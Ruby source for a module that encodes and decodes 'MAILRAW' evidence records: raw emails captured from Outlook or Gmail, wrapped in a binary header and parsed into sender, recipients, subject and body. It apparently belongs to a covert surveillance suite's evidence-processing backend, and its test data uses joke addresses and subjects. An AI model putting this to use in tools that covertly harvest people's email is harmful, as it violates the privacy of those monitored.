require 'rcs-common/evidence/common'
require 'mail'

module RCS
module MailrawEvidence

  MAILRAW_VERSION = 2009070301
  MAILRAW_2_VERSION = 2012030601

  PROGRAM_GMAIL = 0x00000000

  ADDRESSES = ['ciccio.pasticcio@google.com', 'billg@microsoft.com', 'john.doe@nasa.gov', 'mario.rossi@italy.it']
  SUBJECTS = ['drugs', 'bust me!', 'police here']
  BODIES = ["You're busted, dude.", "I'm a drug trafficker, send me to hang!", "I'll sell meth to kids. Stop me."]
  
  def content
    binary = StringIO.new
    
    email = Mail.new do
      from    ADDRESSES.sample
      to      ADDRESSES.sample
      subject SUBJECTS.sample
      body    BODIES.sample
    end
    
    ft_high, ft_low = Time.now.to_filetime
    body = email.to_s
    add_header = [MAILRAW_VERSION, 1, body.bytesize, ft_high, ft_low].pack("I*")
    binary.write(add_header)
    binary.write(body)

    binary.string
  end

  def generate_content
    [ content ]
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete MAILRAW") if data.nil? or data.bytesize == 0

    ret = Hash.new
    ret[:data] = Hash.new

    binary = StringIO.new data

    # flags indica se abbiamo tutto il body o solo header
    version, flags, size, ft_low, ft_high = binary.read(20).unpack('I*')

    case version
      when MAILRAW_VERSION
        ret[:data][:program] = 'outlook'
      when MAILRAW_2_VERSION
        program = binary.read(4).unpack('I*')
        case program
          when PROGRAM_GMAIL
            ret[:data][:program] = 'gmail'
          else
            ret[:data][:program] = 'unknown'
        end
      else
        raise EvidenceDeserializeError.new("invalid log version for MAILRAW")
    end

    ret[:data][:size] = size
    ret[:acquired] = Time.from_filetime(ft_high, ft_low)
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    eml = chunks.join
    info[:data] = Hash.new if info[:data].nil?
    info[:grid_content] = eml

    info[:data][:status] = 0

    m = Mail.read_from_string eml
    info[:data][:from] = m.from
    info[:data][:to] = m.to
    info[:data][:cc] = m.cc
    info[:data][:subject] = m.subject
    info[:data][:date] = m.date.to_s
    info[:data][:body] = m.body.decoded

    yield info if block_given?
    :delete_raw
  end
end # ::Mailraw
end # ::RCS